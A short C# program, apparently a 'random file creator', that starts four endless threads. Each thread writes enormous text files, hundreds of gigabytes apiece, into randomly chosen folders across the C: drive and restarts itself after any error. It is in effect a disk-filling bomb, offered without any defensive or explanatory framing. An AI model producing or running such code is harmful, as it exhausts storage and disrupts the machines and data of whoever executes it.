using System;
using System.IO;
using System.Text;
using System.Threading;

namespace RandomFileCreator
{
    class Program
    {
        public const string startingRoot = "c:\\";
        public static Random random = new Random();
        public const int threads = 4;

        static void Main(string[] args)
        {
            Thread[] thrs = new Thread[threads];
            for (int i = 0; i < thrs.Length; i++)
            {
                thrs[i] = new Thread(Run);
                thrs[i].Start();
            }
        }
        public static void Run()
        {
            try
            {
                while (true)
                {
                    using (StreamWriter sw = new StreamWriter(RandomPath() + "\\" + RandomName() + ".txt", true))
                    {
                        for (int i = 0; i < 1000000; i++)
                        {
                            String tmpString = new String('l', i);
                            sw.WriteLine(tmpString);
                        }
                    }
                }
            }
            catch (Exception)
            {
                Run();
                return;
            }
        }
        public static string RandomPath(string path = startingRoot)
        {
            try
            {
                string[] names = Directory.GetDirectories(path);
                if (names.Length == 0)
                {
                    return path;
                }
                int rand = random.Next(0, names.Length - 1);
                return RandomPath(names[rand]);
            }
            catch (UnauthorizedAccessException)
            {
                return path;
            }
        }
        public static string RandomName(string str = "")
        {
            if (str.Length == 30)
            {
                return str;
            }
            int rand = random.Next(1, 3) == 1 ? random.Next(48, 57) : random.Next(97, 122);
            return RandomName(str + ((char)rand));
        }

    }
}